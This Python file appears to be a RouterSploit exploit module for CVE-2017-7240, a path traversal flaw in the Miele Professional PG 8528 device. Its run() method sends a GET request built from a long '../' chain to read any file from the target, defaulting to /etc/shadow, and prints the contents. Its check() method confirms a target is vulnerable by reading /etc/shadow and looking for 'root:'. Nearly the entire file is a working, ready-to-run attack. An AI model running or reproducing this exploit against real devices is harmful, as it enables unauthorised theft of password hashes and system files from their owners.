from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Miele Professional PG 8528 Path Traversal vulnerability.
    If the target is vulnerable, content of the specified file is returned.
    """
    __info__ = {
        'name': 'Miele Professional PG 8528 Path Traversal',
        'description': 'Module exploits Miele Professional PG 8528 Path Traversal vulnerability which allows '
                       'to read any file on the system.',
        'authors': [
            'Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7240',
            'https://www.exploit-db.com/exploits/41718/',
        ],
        'devices': [
            'Miele Professional PG 8528 PST10'
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    filename = exploits.Option('/etc/shadow', 'File to read')

    def run(self):
        if self.check():
            url = "{}:{}/../../../../../../../../../../../..{}".format(self.target, self.port, self.filename)

            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and response.text:
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/../../../../../../../../../../../../etc/shadow".format(self.target, self.port)

        response = http_request(method="GET", url=url)

        if response is not None and "root:" in response.text:
            return True  # target vulnerable

        return False  # target is not vulnerable
